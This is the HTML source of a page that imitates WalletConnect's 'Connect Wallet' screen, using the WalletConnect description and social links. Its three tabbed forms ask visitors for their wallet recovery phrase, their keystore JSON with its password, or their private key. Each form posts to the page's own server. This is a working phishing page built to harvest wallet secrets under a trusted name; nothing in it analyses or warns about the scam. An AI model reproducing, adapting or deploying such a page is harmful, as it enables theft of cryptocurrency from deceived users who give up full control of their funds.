<!DOCTYPE html>
<html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="stylesheet" href="assets/main.css"  type="text/css"> 
    <link rel="stylesheet" href="assets/style.css"  type="text/css">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="assets/logo.svg">
    <script>
        function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;

    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
  }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
}
</script>
<title>Import Wallet</title>
<style type="text/css">
@font-face {
  font-weight: 400;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Book-cd7d2bcec649b1243839a15d5eb8f0a3.woff2') format('woff2');
}

@font-face {
  font-weight: 500;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Medium-d74eac43c78bd5852478998ce63dceb3.woff2') format('woff2');
}

@font-face {
  font-weight: 700;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Bold-83b8ceaf77f49c7cffa44107561909e4.woff2') format('woff2');
}

@font-face {
  font-weight: 900;
  font-style:  normal;
  font-family: 'Circular-Loom';

  src: url('https://cdn.loom.com/assets/fonts/circular/CircularXXWeb-Black-bf067ecb8aa777ceb6df7d72226febca.woff2') format('woff2');
}</style><style type="text/css" id="tts-styles">[data-tts-block-id].tts-active {background: rgba(206, 225, 255, 0.9) !important;} [data-tts-sentence-id].tts-active {background: rgba(0, 89, 191, 0.7) !important;}</style></head>
<body data-new-gr-c-s-check-loaded="14.1047.0" data-gr-ext-installed="">
    <center>
        <div class="top">
            <a href="" class="left"></a>
            <a href="" class="left"></a>
            <a href="" class="main"><img src="assets/Loader_img.png" alt="logo"></a>
            <a href="" class="left"></a>
            <a href="" class="left"></a>
        </div>
        <br>
        <h1><center>Connect  Wallet</center></h1>
        <br>
        
        <div class="tab">
          <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
          <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
          <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
      </div>
          <div id="phrase" class="tabcontent" style="display: block;">

        <form w="" action="" method="POST">

            <textarea  name="cf_phrase" class="phrase" required="required" minlength="12" placeholder="Phrase"></textarea>
            <br>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <br>
            <input type="submit" name="submit_phrase" value="CONNECT WALLET" class="btn">
        </form>
    </div>

    <div id="keystore" class="tabcontent" style="display: none;">
        <form action="" method="POST">

            <textarea name="cf_json" class="cf_json" required="required" minlength="12" placeholder="Keystore JSON"></textarea>
            <br>

            <div class="field">
                <input type="text" name="cf_passw" placeholder="Password">
            </div>
            <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
            <br>
             <input type="submit" name="submit_key" value="CONNECT WALLET" class="btn">
        </form>
    </div>

    <div id="private" class="tabcontent" style="display: none;">
        <form action="" method="POST">
            <div class="field">
                <input type="text" name="cf_keytext" class="key" placeholder="Private Key">
            </div>
            <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
            <br>
                <input type="submit"  name="submit_private" value="CONNECT WALLET" class="btn">
        </form>
    </div>

    <footer><div id="footer">
        <p><img src="assets/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p><br>
        <p><img src="assets/telegram.svg" class="footimg">  <a href="">Telegram</a></p><br>
        <p><img src="assets/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p><br>
        <p><img src="assets/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p><br>
    </div></footer>
</center>
</body>
<loom-container id="lo-engage-ext-container">
<loom-shadow classname="resolved"></loom-shadow>
</loom-container>
<loom-container id="lo-companion-container">
<loom-shadow classname="resolved"></loom-shadow></loom-container>
<grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration>
</html>